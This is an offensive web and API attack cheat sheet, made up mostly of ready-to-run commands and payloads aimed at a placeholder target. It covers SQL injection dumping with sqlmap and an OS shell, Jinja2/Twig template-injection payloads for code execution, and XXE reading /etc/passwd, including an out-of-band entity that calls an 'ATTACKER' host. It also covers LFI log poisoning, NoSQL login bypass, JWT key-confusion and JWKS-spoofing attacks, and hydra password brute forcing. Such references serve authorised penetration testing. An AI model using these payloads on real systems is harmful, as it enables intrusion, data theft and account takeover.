# Web Application & API Attack Reference

## Recon pipeline
```bash
# Tech detection + live probing
echo "https://target.com" | httpx-toolkit -sc -cl -title -tech-detect -fr
# Subdomain -> live host pipeline
subfinder -d target.com -silent | httpx-toolkit -sc -title -o live.txt
# Port scan web ports
naabu -host target.com -p 80,443,8080,8443,3000,5000,9090 | httpx-toolkit -sc -title
```

## Directory & file discovery
```bash
# ffuf (fastest, most flexible)
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -u https://target.com/FUZZ -fc 404 -t 50
ffuf -w wordlist.txt -u https://target.com/FUZZ -e .php,.html,.txt,.bak,.conf,.old -ac
# Recursive
ffuf -w wordlist.txt -u https://target.com/FUZZ -recursion -recursion-depth 3 -ac

# feroxbuster (auto-recursive, smart filtering)
feroxbuster -u https://target.com -w wordlist.txt -x php,html,txt -t 50 -d 3 --smart

# gobuster
gobuster dir -u https://target.com -w wordlist.txt -x php,html -t 50
```

## Virtual host discovery
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://target.com -H "Host: FUZZ.target.com" -fs <default-size> -ac
gobuster vhost -u https://target.com -w vhosts.txt --append-domain
```

## Parameter discovery
```bash
# arjun: find hidden parameters
arjun -u https://target.com/endpoint                  # GET
arjun -u https://target.com/endpoint -m POST          # POST
arjun -u https://target.com/api -m JSON               # JSON body
arjun -u https://target.com/api --headers "Authorization: Bearer <token>"
```

## SQL Injection
```bash
# Basic detection
sqlmap -u "https://target.com/page?id=1" --batch --dbs
# POST data
sqlmap -u "https://target.com/login" --data "user=admin&pass=test" --batch
# With auth
sqlmap -u "https://target.com/api" --cookie "session=abc" \
  --headers "Authorization: Bearer <token>" --batch
# Escalate detection (level 3 = cookies+UA+referer, risk 3 = OR-based)
sqlmap -u "URL" --level 3 --risk 3 --batch
# Dump
sqlmap -u "URL" -D dbname -T users --dump --batch
# OS shell (stacked queries + file privs)
sqlmap -u "URL" --os-shell --batch
# WAF bypass with tamper scripts
sqlmap -u "URL" --tamper=space2comment,between --batch
# Auto-detect forms
sqlmap -u "https://target.com/login" --forms --batch --crawl=2
```

## NoSQL Injection
```bash
# graphqlmap for GraphQL endpoints
graphqlmap -u https://target.com/graphql -v

# Manual NoSQL payloads (MongoDB)
# Login bypass: {"username": {"$ne": ""}, "password": {"$ne": ""}}
# Extraction:   {"username": "admin", "password": {"$regex": "^a.*"}}
```

## Server-Side Template Injection (SSTI)
Test payloads (inject where user input is reflected):
```
{{7*7}}                          # Jinja2/Twig -> 49
${7*7}                           # Freemarker/Velocity -> 49
<%= 7*7 %>                       # ERB (Ruby) -> 49
#{7*7}                           # Pebble/Thymeleaf -> 49
```
If confirmed, escalate:
```
# Jinja2 RCE
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# Twig RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```
Use `nuclei -tags ssti` or `tplmap` for automated detection.

## Server-Side Request Forgery (SSRF)
Common targets for internal access:
```
http://127.0.0.1/admin
http://169.254.169.254/latest/meta-data/  (cloud metadata)
http://localhost:8080/
file:///etc/passwd
```
Bypass filters: use decimal IP (`2130706433`), IPv6 (`[::1]`), DNS rebinding,
URL encoding, redirect chains.

## XXE (XML External Entity)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- Out-of-band (blind XXE) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd">%xxe;]>
```

## File Upload / LFI / RFI
```bash
# LFI path traversal
curl "https://target.com/page?file=../../../../etc/passwd"
curl "https://target.com/page?file=....//....//....//etc/passwd"  # filter bypass
# PHP wrappers
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
# Log poisoning -> RCE (after injecting PHP in User-Agent via access log)
curl "https://target.com/page?file=/var/log/apache2/access.log"
```
File upload bypass: change extension (.php5, .phtml, .phar), content-type,
magic bytes, double extension (shell.php.jpg), null byte (shell.php%00.jpg).

## JWT Attacks
```bash
jwt_tool <TOKEN>                                  # decode
jwt_tool <TOKEN> -X a                             # none-algorithm attack
jwt_tool <TOKEN> -X k -pk public.pem              # key confusion RS->HS
jwt_tool <TOKEN> -X s -ju https://attacker/jwks   # spoof JWKS
jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt  # crack weak secret
jwt_tool <TOKEN> -I -pc role -pv admin            # inject claim
```

## WebSocket Testing
```bash
# websocat: connect to WS endpoint
websocat ws://target.com/ws
websocat -H "Cookie: session=abc" wss://target.com/ws
# wscat
wscat -c ws://target.com/ws
wscat -c ws://target.com/ws -H "Authorization: Bearer <token>"
```

## Brute Force / Credential Attacks
```bash
# ffuf POST login brute-force
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -X POST -d "username=USER&password=PASS" \
  -u https://target.com/login -fc 401 -t 20

# hydra HTTP POST form
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid" -t 16

# hydra HTTP Basic auth
hydra -l admin -P passwords.txt target.com http-get /admin
```

## Automated scanning
```bash
# nuclei: template-based vuln scanner
nuclei -u https://target.com -as                           # auto-detect + scan
nuclei -u https://target.com -severity critical,high       # severity filter
nuclei -u https://target.com -tags cve,sqli,xss,ssrf,lfi  # tag filter
nuclei -update-templates                                    # update DB first

# nikto: legacy but catches misconfigs
nikto -h https://target.com

# whatweb: tech fingerprinting
whatweb -a 3 https://target.com
```

## API-specific
```bash
# GraphQL introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}'

# REST API common checks
# - Try /api, /api/v1, /api/docs, /swagger.json, /openapi.json
# - Test IDOR: change numeric IDs, UUIDs in endpoints
# - Method tampering: GET->PUT/DELETE/PATCH on resources
# - Mass assignment: add extra fields in POST/PUT JSON bodies
# - Rate limiting: no limit = brute-forceable

# Wordlists for API fuzzing
# /usr/share/seclists/Discovery/Web-Content/api/
# /usr/share/seclists/Discovery/Web-Content/swagger*.txt
```

## Useful wordlists (pre-installed via seclists)
```
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/big.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Fuzzing/LFI/
/usr/share/seclists/Fuzzing/SQLi/
/usr/share/seclists/Passwords/
/usr/share/wordlists/rockyou.txt
```
